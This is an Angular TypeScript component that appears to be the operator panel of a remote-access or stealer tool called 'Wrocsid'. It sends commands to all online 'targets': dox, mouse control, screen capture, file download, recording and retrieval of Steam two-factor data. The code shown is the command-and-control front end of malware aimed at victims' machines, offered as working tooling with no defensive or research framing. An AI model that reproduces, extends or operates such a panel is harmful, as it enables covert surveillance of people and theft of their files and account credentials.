import { Component, Input, OnInit } from '@angular/core';
import { AbstractControl, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { firstValueFrom } from 'rxjs';
import { Target } from 'src/app/Model';
import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';

@Component({
  selector: 'app-commands-all',
  templateUrl: './commands-all.component.html',
  styleUrls: ['./commands-all.component.css']
})
export class CommandsAllComponent implements OnInit {
  mouseFormAll!: FormGroup
  recordFormAll!: FormGroup
  downloadFormAll!: FormGroup
  path: string = ""

  @Input() targets!: Array<Target>

  constructor(private wrocsid:WrocsidService, private fb: FormBuilder) {}

  async ngOnInit(): Promise<void> {
    this.mouseFormAll = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.recordFormAll = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.downloadFormAll = this.fb.group({
      path: ['', [Validators.required, Validators.minLength(6)]],
    })
  }

  timeControlValidation(control: AbstractControl) {
    if (Number(control.value) <= 0) {
      return { invalidTimeAmount: true };
    }
    return null;
  }

  getPath(form: FormGroup) {
    return String(form.controls['path'].value)
  }

  concatTime(form: FormGroup) {
    return String(form.controls['timeAmount'].value).concat(form.controls['timeUnits'].value)
  }

  wrocsidHandler(command: string, identifier: any, args?: any) {
    switch (command) {
      case 'dox':
        this.wrocsid.dox(identifier)
        break;
      case 'mouse':
        this.wrocsid.mouse(identifier, args)
        break;
      case 'screen':
        this.wrocsid.screen(identifier)
        break;
      case 'download':
        this.wrocsid.download(identifier, args)
        break;
      case 'record':
        this.wrocsid.record(identifier, args)
        break;
      case 'getSteam2fa':
        this.wrocsid.getSteam2fa(identifier)
        break;
    }
  }

  onlineFilter(target: Target, online: Boolean): boolean {
    return target.online == online
  }

  sendCommandToAllOnlineTargets(command: string, args?: any) {
    let onlineTargets = this.targets.filter((target: Target) => this.onlineFilter(target, true))
    onlineTargets.forEach((onlineTarget: Target) => {
      if(args) {
        this.wrocsidHandler(command, onlineTarget.identifier, args)
      } else {
        this.wrocsidHandler(command, onlineTarget.identifier)
      }
    });
  }
}
